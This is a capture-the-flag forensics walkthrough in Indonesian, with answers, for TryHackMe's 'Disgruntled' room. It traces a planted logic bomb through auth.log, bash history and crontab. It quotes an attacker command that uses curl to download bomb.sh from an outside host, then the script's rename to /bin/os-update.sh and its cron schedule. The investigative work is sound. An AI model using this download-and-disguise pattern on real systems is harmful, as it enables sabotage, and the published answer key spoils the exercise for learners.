# Disgruntled
- TryHackMe Challenge: https://tryhackme.com/room/disgruntled
- IP Machine: 10.10.166.127

## Task 1 Introduction
- Akses machine dengan SSH kemudian masukkan password sesuai petunjuk soal
```sh
ssh root@IP_Machine
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%201.JPG)

## Task 3 Nothing suspicious... So far
- **Pertanyaan:** The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
- Untuk menemukan jawabannya kita bisa mengecek file **/var/log/auth.log**. Kemudian untuk menginstall package biasanya diikuti kata "install", sehingga kita bisa memfilter log yang mengandung kata "install"
```sh
cat /var/log/auth.log | grep install
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%202.JPG)

- **Jawaban:**
```sh
/usr/bin/apt install dokuwiki
```

- **Pertanyaan:** What was the present working directory (PWD) when the previous command was run?
- Tinggal kita lihat nilai PWD di log

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%203.JPG)

- **Jawaban:**
```sh
/home/cybert
```

## Task 4 Let’s see if you did anything bad
- **Pertanyaan:** Which user was created after the package from the previous task was installed?
- Kita bisa menemukan jawabannya di file yang sama. Kemudian kita memfilter yang mengandung kata "adduser"
```sh
cat /var/log/auth.log | grep adduser
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%204.JPG)

- **Jawaban:**
```sh
it-admin
```

- **Pertanyaan:** A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
- Kita bisa menemukan jawabannya di file yang sama. Kemudian kita memfilter yang mengandung kata "visudo". Visudo adalah tool digunakan untuk memperbarui atau memodifikasi file sudoers.
```sh
cat /var/log/auth.log | grep visudo
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%205.JPG)

- **Jawaban:**
```sh
Dec 28 06:27:34
```

- **Pertanyaan:** A script file was opened using the "vi" text editor. What is the name of this file?
- Kita bisa menemukan jawabannya di file yang sama. Kemudian kita memfilter yang mengandung kata "vi"
```sh
cat /var/log/auth.log | grep vi
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%206.JPG)

- **Jawaban:**
```sh
bomb.sh
```

## Task 5 Bomb has been planted. But when and where?
- **Pertanyaan:** What is the command used that created the file `bomb.sh` ?
- Dari pertanyaan Task 4, kita mengetahui bahwa file `bomb.sh` berada di path **/home/it-admin**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%207.JPG)

- Kemudian kita lihat riwayat perintah di path tersebut dengan bash history
```sh
cat /home/it-admin/.bash_history
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%208.JPG)

- **Jawaban:**
```sh
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

- **Pertanyaan:** The file was renamed and moved to a different directory. What is the full path of this file now?
- Dari pertanyaan Task 4, kita mengetahui bahwa penyerang menggunakan vi editor jadi kita bisa mengecek riwayat entry kemudian memfilter riwayat yang mengandung kata "saveas" untuk melacak perubahan nama file

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%209.JPG)

- **Jawaban:**
```sh
/bin/os-update.sh
```

- **Pertanyaan:** When was the file from the previous question last modified? (Format: Month Day HH:MM)
- Kita bisa menggunakan ls untuk mengetahui kapan file tersebut dimodifikasi terakhir kali. Namun sayangnya kita tidak dapat mengetahui pukul berapa file tersebut diubah
```sh
ls -la /bin | grep os-update
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%2010.JPG)

- Kita dapat menggunakan tool date untuk menampilkan detail waktunya
```sh
date -r /bin/os-update.sh
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%2011.JPG)

- **Jawaban:**
```sh
Dec 28 06:29
```

- **Pertanyaan:** What is the name of the file that will get created when the file from the first question executes?
- Buka file **os-update.sh**
```sh
cat /bin/os-update.sh
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%2012.JPG)

- **Jawaban:**
```sh
goodbye.txt
```

## Task 6 Following the fuse
- **Pertanyaan:** At what time will the malicious file trigger? (Format: HH:MM AM/PM)
- Jika kita mempunyai malicious yang siap dijalankan maka file tersebut sudah pasti terjadwal di cron job. Kita bisa memeriksa file /etc/crontab untuk memastikannya
```sh
cat /etc/crontab
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Disgruntled/assets/d%2013.JPG)

- Secara berurutan setiap kolomnya mendefinisikan menit, jam, hari dalam sebulan, bulan, dan hari dalam seminggu.
- **Jawaban:**
```sh
08:00 AM
```